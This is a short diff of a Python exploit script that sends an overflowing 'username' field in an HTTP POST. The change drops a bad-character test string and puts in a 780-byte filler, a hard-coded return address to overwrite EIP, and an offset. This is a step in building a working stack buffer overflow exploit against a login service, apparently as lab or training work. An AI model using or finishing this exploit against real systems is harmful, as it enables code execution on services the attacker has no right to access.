@@ -25,9 +25,10 @@ headers = {
 
 print(f"starting overflow on {url}")
 
-username = 'A' * 780 + 'BBBB' + 'C' * 16
-# Get ascii characters, excluding the ones know to be bad
-username += ''.join(chr(i) for i in range(128) if i not in args.exclude)
+filler = 'A' * 780 
+eip = "\x83\x0c\x09\x10"
+offset = 'C' * 16
+username = filler + eip + offset
 
 data = {
     "username": username,
@@ -38,5 +39,3 @@ try:
     print("received response, overflow failed")
 except requests.exceptions.ReadTimeout:
     print("request timed out")
-
-
